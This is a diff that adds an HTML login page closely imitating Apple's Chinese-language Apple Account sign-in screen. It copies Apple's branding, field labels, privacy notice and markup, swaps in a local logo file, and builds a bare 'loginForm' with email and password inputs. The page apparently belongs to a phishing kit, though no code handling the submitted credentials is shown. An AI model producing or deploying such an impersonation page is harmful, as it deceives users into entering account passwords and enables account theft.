@@ -1,0 +1,135 @@
+<!-- 登录页面 -->
+<div id="loginPage" class="page">
+    <div class="app-body-container app-body-container-auth">
+      <main role="main">
+        <div class="landing landing--sign-in landing--transition">
+          <div class="landing__top">
+            <div aria-hidden="true" class="landing__animation">
+              <div class="landing__rings">
+                <img src="./public/images/logo.png" />
+              </div>
+            </div>
+
+            <div class="landing__interaction">
+              <div class="sign-in">
+                <div id="sign-in__auth" class="sign-in__auth sign-in__auth--full">
+                  <div class="si-body si-container container-fluid auto-resize" id="content" role="main"
+                    aria-labelledby="contentheader" data-theme="dark"><apple-auth
+                      app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
+                      <div
+                        class="widget-container  widget-container--v2  widget-container--v2__auto  fade-in restrict-min-content  restrict-max-wh  fade-in "
+                        data-mode="inline" data-isiebutnotedge="false">
+                        <div id="resize-container" class="resize-container">
+                          <div class="resize-wrapper--resize  ">
+                            <div id="step" class="si-step  ">
+                              <div id="stepEl">
+                                <sign-in error-message="{errorMessage}" suppress-iforgot="{suppressIforgot}"
+                                  initial-route="" {on-test-idp}="@_onTestIdp">
+                                  <form id="loginForm"> 
+                                  <div id="signin" class="signin fade-in signin--v2">
+                                    <app-title signin-label="true" title-class="">
+                                      <h1 tabindex="-1" class="si-container-title tk-callout" id="contentheader" data-i18n="member_login">
+                                        Apple 账户
+                                      </h1>
+                                    </app-title>
+                                    <p class="si-container-description" data-i18n="manage_your_apple_account">管理你的 Apple 账户</p>
+                                    <div class="signin-v2">
+                                      <div class="swp-option-container swp-enable container si-field-container  password-second-step  password-on">
+                                        <div id="sign_in_form" class="signin-form swp eyebrow account-name-entered fed-auth show-password password-entered ">
+                                          <div>
+                                            <div class="signin-content signin-content-area">
+                                              <div class="account-name show-password ">
+                                                <div>
+                                                  <div class=" form-cell-wrapper form-textbox">
+                                                    <input type="text" id="email"
+                                                      can-field="accountName" aria-labelledby="apple_id_field_label"
+                                                      autocorrect="off" autocapitalize="off" aria-required="true"
+                                                      required spellcheck="false"
+                                                      ($focus)="appleIdFocusHandler($element)"
+                                                      ($blur)="appleIdBlurHandler()"
+                                                      class="force-ltr form-textbox-input form-textbox-entered"
+                                                      autocomplete="off" aria-invalid="false">
+                                                    <span aria-hidden="true" id="apple_id_field_label"
+                                                      class=" form-textbox-label  form-label-flyout" data-i18n="email_or_phone">
+                                                      电子邮件或电话号码
+                                                    </span>
+                                                  </div>
+                                                </div>
+                                              </div>
+                                              <div class="password   show-password show-placeholder   ">
+                                                <div>
+                                                  <div class="form-cell-wrapper form-textbox  ">
+                                                    <input type="password" id="password"
+                                                      aria-labelledby="password_field_label"
+                                                      ($focus)="pwdFocusHandler()" ($blur)="pwdBlurHandler()"
+                                                      aria-required="true" required can-field="password"
+                                                      autocomplete="off"
+                                                      class="form-textbox-input  form-textbox-entered "
+                                                      aria-invalid="false">
+                                                    <span id="password_field_label" aria-hidden="true"
+                                                      class=" form-textbox-label  form-label-flyout" data-i18n="password">密码 </span>
+                                                    <span class="sr-only form-label-flyout"
+                                                      id="invalid_user_name_pwd_err_msg" aria-hidden="true"></span>
+                                                  </div>
+                                                </div>
+                                              </div>
+
+                                              <div class=" signin-content__footer signin-content__footer--has-content">
+                                                <div class="signin-content__footer__items">
+                                                  <div class="si-remember-password">
+                                                    <div class="form-checkbox">
+                                                      <input type="checkbox" id="remember-me"
+                                                        {($checked)}="isRememberMeChecked" class="form-checkbox-input">
+                                                      <label id="remember-me-label" for="remember-me"
+                                                        class="form-label tk-body-reduced ">
+                                                        <span class="form-checkbox-indicator"
+                                                          aria-hidden="true"></span><span data-i18n="remember_me">记住我的账户</span>
+                                                      </label>
+                                                    </div>
+                                                  </div>
+                                                </div>
+                                              </div>
+                                              <div class="ue-privacy ue-privacy--hide">
+                                                <div
+                                                  class="label-small text-centered centered tk-caption privacy-wrapper">
+                                                  <div class="privacy-icon"></div>
+                                                  <div class="tk-caption">
+                                                    <p data-i18n="apple_account_privacy">您的 Apple 账户信息用于让您安全登录和访问您的数据。Apple
+                                                      会出于安全、支持和报告目的记录某些数据。如果您同意，Apple 还可能使用您的 Apple
+                                                      账户信息向您发送营销电子邮件和通信，包括基于您对 Apple 服务的使用情况。了解数据的管理方式…<span class="sr-only">在新窗口中打开。</span></p>
+                                                  </div>
+                                                </div>
+                                              </div>
+                                            </div>
+                                            <div class="signin-v2__buttons-wrapper">
+                                              <div class="signin-v2__buttons-wrapper__button-wrapper">
+                                                <div>
+                                                  <button type="submit" id="sign-in" class=" tk-subbody button button-rounded-rectangle signin-v2__buttons-wrapper__button-wrapper__button">
+                                                    <span class="signin-v2__buttons-wrapper__button-wrapper__button__text" data-i18n="login">登录</span>
+                                                  </button>
+                                                </div>
+                                              </div>
+                                            </div>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                    <span id="contentheader" class="hide" data-i18n="login_apple_account">登录 Apple&nbsp;账户</span>
+                                  </div>
+                                </form>
+                                </sign-in>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </apple-auth>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+</div>
